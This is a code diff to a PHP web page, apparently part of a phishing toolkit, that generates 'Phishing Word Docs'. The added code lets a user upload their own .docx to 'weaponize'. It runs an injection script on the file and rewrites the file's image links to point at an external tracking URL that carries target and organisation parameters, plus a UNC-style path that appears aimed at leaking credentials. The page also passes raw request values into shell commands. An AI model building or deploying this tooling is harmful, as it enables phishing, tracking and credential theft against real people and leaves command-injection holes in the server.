@@ -317,7 +317,7 @@ td.input input {
 </style>
 </HEAD>
 <BODY>
-
+<FONT COLOR="#ffffff">
 <?php
 if(isset($_REQUEST['URL'])){
 
@@ -327,28 +327,123 @@ $HTTPValue = $_REQUEST['HTTPValue'];
 $Target = $_REQUEST['Target'];
 $Org = $_REQUEST['Org'];
 
-$cmd1 = "cp document.xml.rels.TEMPLATE word/_rels/document.xml.rels;";
-exec($cmd1);
+$cmdcleanup = "sudo rm -rf /var/www/uploads/*;";
+exec($cmdcleanup);
 
-$cmd2 = "sed -i -e 's~HTTPVALUE~".$HTTPValue."~g' word/_rels/document.xml.rels;";
-exec($cmd2);
+// File Upload Piece
+$target_dir = "../../uploads/";
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+$uploadOk = 1;
+$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
 
-$cmd3 = "sed -i -e 's~URLVALUE~".$URL."~g' word/_rels/document.xml.rels;";
-exec($cmd3);
+// Check file size
+if ($_FILES["fileToUpload"]["size"] > 15000000) {
+    echo "Sorry, your file is too large.";
+    $uploadOk = 0;
+}
+if ($_FILES["fileToUpload"]["size"] == 0) {
+   //echo $_FILES["fileToUpload"]["size"];
+    $uploadOk = 0;
+}
+// Allow certain file formats
+if($imageFileType != "doc" && $imageFileType != "docx" && $imageFileType != "") {
+    echo "Sorry, only Word documents are allowed.";
+    $uploadOk = 0;
+}
+// Check if $uploadOk is set to 0 by an error
+if ($uploadOk == 0) {
+//    echo "Sorry, your file was not uploaded.";
+// if everything is ok, try to upload file
+} else {
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+//        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
+    } else {
+//        echo "Sorry, there was an error uploading your file.";
+    }
+}
 
-$cmd4 = "sed -i -e 's~TARGETVALUE~".$Target."~g' word/_rels/document.xml.rels;";
-exec($cmd4);
+if($uploadOk == 1){
 
-$cmd5 = "sed -i -e 's~ORGVALUE~".$Org."~g' word/_rels/document.xml.rels;";
-exec($cmd5);
+$cmd0 = "sudo cp '/var/www/uploads/".basename( $_FILES["fileToUpload"]["name"])."' /var/www/uploads/Phishing.docx;";
+exec($cmd0,$output0);
 
-$cmd6 = "sudo zip -r Phishing.docx word/_rels/document.xml.rels";
-exec($cmd6);
+//var_dump($output0);
+//echo $cmd0;
+
+$cmd1 = "sudo python InjectPayload.py \"".basename( $_FILES["fileToUpload"]["name"])."\";";
+exec ($cmd1,$output1);
+
+//var_dump($output1);
+//echo $cmd1;
+
+$cmd2 = "cd /var/www/uploads/ && sudo unzip -o Phishing.docx;";
+exec ($cmd2,$output2);
+
+//var_dump($output2);
+//echo $cmd2;
+
+$cmd3 = "ls /var/www/uploads/word/media -1 | sort -V | tail -2 |grep 'png'";
+exec ($cmd3,$outputcmd2);
+
+//echo $cmd3;
+//var_dump($outputcmd2);
+
+$cmd4 = 'sudo sed -i -e \'s~media/'.$outputcmd2[0].'\\"~'.$HTTPValue.'://'.$URL.'/phishingdocs?target='.$Target.'\&amp;org='.$Org.'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+exec($cmd4,$output4);
+
+//var_dump($output4);
+//echo $cmd4;
+
+$cmd5 = 'sudo sed -i -e \'s~media/'.$outputcmd2[1].'\\"~\\\\\\\\\\'.$URL.'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+exec($cmd5,$output5);
+
+//var_dump($output5);
+//echo $cmd5;
+
+$cmd6 = "cd /var/www/uploads/ && sudo zip -r Phishing.docx word/_rels/document.xml.rels;";
+exec($cmd6, $output6);
+
+//var_dump($output6);
+//echo $cmd6;
+
+$cmd7 = "cp /var/www/uploads/Phishing.docx /var/www/html/phishingdocs/PhishingTEMPLATE.docx;";
+exec($cmd7, $output7);
+
+//var_dump($output7);
+//echo $cmd7;
+
+} else {
+
+$cmd8 = "cp document.xml.rels.TEMPLATE word/_rels/document.xml.rels;";
+exec($cmd8);
+
+$cmd9 = "sed -i -e 's~HTTPVALUE~".$HTTPValue."~g' word/_rels/document.xml.rels;";
+exec($cmd9);
+
+$cmd10 = "sed -i -e 's~URLVALUE~".$URL."~g' word/_rels/document.xml.rels;";
+exec($cmd10);
+
+$cmd11 = "sed -i -e 's~TARGETVALUE~".$Target."~g' word/_rels/document.xml.rels;";
+exec($cmd11);
+
+$cmd12 = "sed -i -e 's~ORGVALUE~".$Org."~g' word/_rels/document.xml.rels;";
+exec($cmd12);
+
+$cmd13 = "sudo zip -r Phishing.docx word/_rels/document.xml.rels";
+exec($cmd13);
+
+}
 
 ?>
 <CENTER>
 <br><br>
+<?php
+if($uploadOk == 1){
+?>
+<form action="PhishingTEMPLATE.docx" method="get">
+<?php } else { ?>
 <form action="Phishing.docx" method="get">
+<?php } ?>
 <button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i>Download</button>
 </form>
 </CENTER>
@@ -357,7 +452,7 @@ exec($cmd6);
 }
 else {
 ?>
-<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>">
+<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
 <CENTER>
 <FONT COLOR="#ffffff"><H1>Create a Phishing Word Doc</H1></FONT><br>
 <TABLE>
@@ -366,6 +461,12 @@ else {
 </TR>
 <TR>
 <TD><SELECT NAME="HTTPValue"><option value="http">http</option><option value="https">https</option></SELECT></TD><TD><input type="text" name="URL" value="<?php echo $_SERVER['SERVER_NAME'];?>"></TD><TD><input type="text" name="Target" value="Joe Smith"></TD><TD><input type="text" name="Org" value="Evil Corp"></TD>
+</TR>
+<TR>
+<TD COLSPAN="4">
+<i>(<b>Optional</b> - Weaponize Your Own Document!)<i><br><br>
+<input type="file" name="fileToUpload" id="fileToUpload">
+</TD>
 </TR>
 </TABLE>
 <br><br><button class="btn"><i class="fa fa-download" type="submit"></i>Generate Payload!</button>
@@ -380,6 +481,7 @@ else {
 ?>
 
 </BODY>
+</FONT>
 </HTML>
 <?php
 }
